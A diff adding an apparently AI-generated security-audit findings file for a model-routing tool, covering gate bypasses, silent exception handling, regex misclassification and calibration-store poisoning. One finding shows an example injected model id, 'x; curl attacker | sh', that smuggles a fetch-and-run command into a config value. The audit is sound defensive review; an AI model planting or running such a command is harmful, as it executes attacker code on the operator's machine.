@@ -1,0 +1,170 @@
+{
+  "findings": [
+    {
+      "id": "DISS-C-001",
+      "severity": "MEDIUM",
+      "category": "config",
+      "anchor": "_catalog_provider_maps",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": "routes_to_agy",
+      "cross_file_justification": null,
+      "description": "_catalog_provider_maps swallows every exception from _find_project_root, the system catalog read and load_project_config (bare `except Exception`), builds maps from whatever survived, and caches that result under the project root for the life of the process. routes_to_agy under `cli-only` now depends on these maps; when a layer fails to load, the only rule left is the `gemini*` name prefix, so catalog-only Google models and aliases (`deep-research-pro`, `researcher`) are reported as not agy-routed. No log line is emitted on failure.",
+      "failure_mode": "A malformed or unreadable model-config.yaml / project config, or a packaging layout where `Path(__file__).parents[3]/defaults` does not exist, silently turns the agy opt-in gate fail-open for every catalog Google model, and the failed read is pinned in _CATALOG_PROVIDERS_CACHE until restart.",
+      "suggested_fix": "Log read failures at warning level; do not cache a result when any layer raised (or cache a sentinel with retry); and have routes_to_agy treat an unresolvable provider under `cli-only` as an explicit error rather than 'not google'. Add a test that feeds a corrupt YAML and asserts the gate does not fail open.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-002",
+      "severity": "MEDIUM",
+      "category": "authz",
+      "anchor": "routes_to_agy",
+      "anchor_type": "function",
+      "scope": "cross_file",
+      "trigger_anchor": "routes_to_agy",
+      "cross_file_justification": "loader.py's docstring declares routes_to_agy the Python twin of `.claude/scripts/lib/agy-gate-lib.sh` routes_to_agy with 'one rule for every reader'. The diff changes the Python rule from the `gemini*` name test to catalog provider resolution but does not touch the shell library, so the two gates no longer implement the same predicate.",
+      "description": "The Python gate now recognises catalog Google models (`deep-research-pro`, `researcher`) as agy-routed under `cli-only`; the shell gate that hooks and scripts source is not updated in this change and still applies the bare `gemini*` name rule.",
+      "failure_mode": "Shell-side callers of the agy gate let catalog Google models through un-gated under `cli-only` while cheval actually dispatches them through agy, so the opt-in check is bypassed for exactly the models R3 was meant to cover.",
+      "suggested_fix": "Update agy-gate-lib.sh in the same change to consult the generated catalog maps (generated-model-maps.sh is already produced from the same YAML), and add a parity test that runs the same model list through both implementations.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-003",
+      "severity": "MEDIUM",
+      "category": "authz",
+      "anchor": "catalog_provider_of",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": "routes_to_agy",
+      "cross_file_justification": null,
+      "description": "catalog_provider_of returns the raw provider prefix of an alias target. An alias whose target is `gemini-headless:<model>` therefore resolves to provider `gemini-headless`, and routes_to_agy compares that only against `\"google\"`. The earlier by-name branch matches the literal `gemini-headless` token in the model string, not alias names, so an alias such as `researcher: gemini-headless:gemini-2.5-pro` is dispatched through agy in practice but routes_to_agy returns False in every headless mode, not just `cli-only`.",
+      "failure_mode": "agy opt-in gate silently bypassed for any aliased gemini-headless target; the model is sent through the agy CLI without the gate ever firing.",
+      "suggested_fix": "In routes_to_agy, resolve aliases before the by-name check, or treat `catalog_provider_of(m) == \"gemini-headless\"` as agy-routed in any mode (keeping `google` only under `cli-only`). Add a unit test with an alias pointing at a gemini-headless target.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-004",
+      "severity": "LOW",
+      "category": "injection",
+      "anchor": "_calibrate_hint",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": null,
+      "cross_file_justification": null,
+      "description": "_calibrate_hint formats entry.model_id / head.model_id unquoted into _PROBE_COMMAND, and cmd_invoke prints the result to stderr prefixed with `run:` and embeds it in the `calibrate` field of the error JSON. Model ids originate in project config discovered by cwd walk, i.e. from whichever repository cheval is executed in.",
+      "failure_mode": "A model id such as `x; curl attacker | sh` checked into a project's model config becomes a copy-paste command injection against the operator, and any tooling that auto-executes the `calibrate` field runs it directly.",
+      "suggested_fix": "Wrap the model id with shlex.quote when building the hint (and quote the --transport value), and validate model ids against a strict character allow-list at config load time.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-005",
+      "severity": "LOW",
+      "category": "input-validation",
+      "anchor": "_RE_THROTTLE_STATUS",
+      "anchor_type": "line",
+      "scope": "diff",
+      "trigger_anchor": "is_throttle_message",
+      "cross_file_justification": null,
+      "description": "The status regex `(?<![\\d,.])(?:429|529)(?!\\d|[,.]\\d|\\s*k?\\s*tokens\\b)` only excludes 429/529 when adjacent to digits, separators or 'tokens'. It still matches those digits embedded in alphanumeric tokens: request ids (`req_a529fz`), UUIDs (`5f429a1b-...`), hex hashes, file paths. Because ClaudeHeadlessAdapter now lets is_throttle_message win over is_context_limit_message, a genuine size verdict whose text carries such an id is reclassified as a throttle.",
+      "failure_mode": "Oversized payloads are retried and walked to the next voice (the exact case the D-1.1b arm exists to prevent), inflating provider spend and rate-limit pressure; error text is CLI/provider controlled and can include echoed prompt or tool output, so the misclassification is externally influenceable.",
+      "suggested_fix": "Anchor the status match to a status context, e.g. `(?<![\\w,.])(?:429|529)(?!\\w|[,.]\\d|\\s*k?\\s*tokens\\b)` or `(?:status|error|http)\\W{0,3}(?:429|529)\\b`, and add fixtures containing UUIDs and request ids alongside a context-limit statement.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-006",
+      "severity": "LOW",
+      "category": "input-validation",
+      "anchor": "is_context_limit_message",
+      "anchor_type": "function",
+      "scope": "cross_file",
+      "trigger_anchor": "is_context_limit_message",
+      "cross_file_justification": "cheval.py cmd_invoke (diff-touched) records parse_context_limit output (observed_input_tokens, provider_limit) into the observed-ceiling store (_observed_store_path, observation_recorded) and refuses to walk; the broadened matcher in ceiling.py decides what feeds that store.",
+      "description": "is_context_limit_message now classifies on bare `~N tokens (limit M)` style numeric patterns (_RE_INPUT_ONLY, _RE_INPUT_PLUS_OUTPUT, _RE_CLI_TOKENS_LIMIT) with no marker word. Any CLI or provider error text containing such a pattern, including content echoed from the prompt or tool output, is treated as a provider size verdict and its numbers are persisted as calibration observations.",
+      "failure_mode": "Calibration-store poisoning: one crafted or coincidental error string lowers the recorded ceiling, after which every larger payload is refused with calibration_needed instead of being walked, until an operator re-probes.",
+      "suggested_fix": "Accept the bare numeric form only when the message also matches the CLI's known pre-flight shape (e.g. 'Prompt is too long' / 'the request is'), and sanity-check parsed numbers against the catalog ceiling (reject values far below it) before recording an observation.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    }
+  ],
+  "metadata": {
+    "type": "audit",
+    "model": "gpt-5.5-pro",
+    "sprint_id": "sprint-251",
+    "timestamp": "2026-10-07T15:45:05Z",
+    "status": "clean",
+    "status_note": "no findings met the BLOCKING/ADVISORY bar — not an approval of unreviewed surface",
+    "degraded": false,
+    "schema_enforced": false,
+    "parse_path": "normalized",
+    "model_attempts": [
+      "gpt-5.5-pro:clean"
+    ],
+    "final_model": "gpt-5.5-pro",
+    "rejected_summary": [],
+    "rejected_count": 0,
+    "cost_usd": 0,
+    "tokens_input": 2,
+    "tokens_output": 16461,
+    "companion_voice": {
+      "planned": true,
+      "family": "anthropic",
+      "family_basis": "configured_primary",
+      "chain": [
+        "claude-headless"
+      ],
+      "shared_hops": [
+        "claude-headless"
+      ],
+      "model": "claude-headless",
+      "answered_by": "claude-headless",
+      "status": "succeeded",
+      "failure_class": null,
+      "cost_cents": 0,
+      "attempts": [
+        "claude-headless:reviewed"
+      ],
+      "independent": true,
+      "counted_as": "independent_voice",
+      "primary_succeeded_model": "codex-headless",
+      "rejected_sidecar": null
+    },
+    "rejected_sidecars": [],
+    "hallucination_filter": {
+      "applied": true,
+      "downgraded": 0
+    },
+    "scope": {
+      "diff_range": null,
+      "diff_oids": null,
+      "diff_sha256": "89074f4c96c128e60b0de5be8a7e9269c94121490835b06b701053d438d4e0dd",
+      "run_tag": "a4-delta"
+    }
+  },
+  "verdict_quality": {
+    "consensus_outcome": "consensus",
+    "truncation_waiver_applied": false,
+    "voices_planned": 2,
+    "voices_succeeded": 2,
+    "voices_succeeded_ids": [
+      "codex-headless",
+      "claude-headless"
+    ],
+    "voices_dropped": [],
+    "chain_health": "ok",
+    "confidence_floor": "high",
+    "rationale": "multi-voice aggregate (2/2 succeeded); chain_health=ok",
+    "single_voice_call": false,
+    "status": "APPROVED"
+  }
+}
